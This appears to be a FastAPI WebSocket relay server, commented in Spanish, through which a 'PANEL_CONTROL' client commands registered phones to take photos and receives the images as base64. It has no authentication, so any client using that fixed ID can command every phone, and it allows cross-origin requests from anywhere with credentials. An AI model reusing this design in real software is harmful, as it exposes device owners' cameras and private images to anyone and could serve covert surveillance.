from fastapi import FastAPI, WebSocket, WebSocketDisconnect
from fastapi.middleware.cors import CORSMiddleware
import json
import os
import uvicorn

app = FastAPI()

# Configuración de CORS para evitar el error 403
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# Diccionarios para gestionar las conexiones activas
# { "ID_6_CHARS": websocket_object }
dispositivos_activos = {}
paneles_control = []

@app.get("/")
async def root():
    return {"status": "Servidor activo", "dispositivos_conectados": len(dispositivos_activos)}

@app.websocket("/ws/{client_id}")
async def websocket_endpoint(websocket: WebSocket, client_id: str):
    await websocket.accept()
    
    if client_id == "PANEL_CONTROL":
        paneles_control.append(websocket)
        print("Panel de control conectado.")
        # Enviar lista inicial de dispositivos al panel
        await websocket.send_text(json.dumps({
            "tipo": "lista_dispositivos", 
            "ids": list(dispositivos_activos.keys())
        }))
    else:
        # Es un celular: lo registramos con su ID aleatorio
        dispositivos_activos[client_id] = websocket
        print(f"Dispositivo registrado: {client_id}")
        # Notificamos al panel que hay un nuevo celular listo
        await notificar_paneles({
            "tipo": "nuevo_dispositivo", 
            "id": client_id
        })

    try:
        while True:
            # Escuchar mensajes entrantes
            data = await websocket.receive_text()
            mensaje = json.loads(data)

            # Caso A: El Panel envía una orden (tomar foto) a un celular
            if client_id == "PANEL_CONTROL":
                target_id = mensaje.get("target_id")
                if target_id in dispositivos_activos:
                    await dispositivos_activos[target_id].send_text(json.dumps(mensaje))
            
            # Caso B: El Celular envía la imagen (Base64) de vuelta
            else:
                await notificar_paneles({
                    "tipo": "imagen_recibida",
                    "device_id": client_id,
                    "image_data": mensaje.get("image_data")
                })

    except WebSocketDisconnect:
        if client_id == "PANEL_CONTROL":
            if websocket in paneles_control:
                paneles_control.remove(websocket)
        else:
            if client_id in dispositivos_activos:
                del dispositivos_activos[client_id]
                await notificar_paneles({
                    "tipo": "dispositivo_desconectado", 
                    "id": client_id
                })
        print(f"Cliente {client_id} desconectado.")

async def notificar_paneles(data):
    """Envía información a todos los paneles de control abiertos"""
    for panel in paneles_control:
        try:
            await panel.send_text(json.dumps(data))
        except:
            # Si un panel se cerró mal, lo ignoramos
            pass

# Punto de entrada para Render
if __name__ == "__main__":
    # Render asigna un puerto automáticamente en la variable de entorno PORT
    port = int(os.environ.get("PORT", 10000))
    uvicorn.run(app, host="0.0.0.0", port=port)
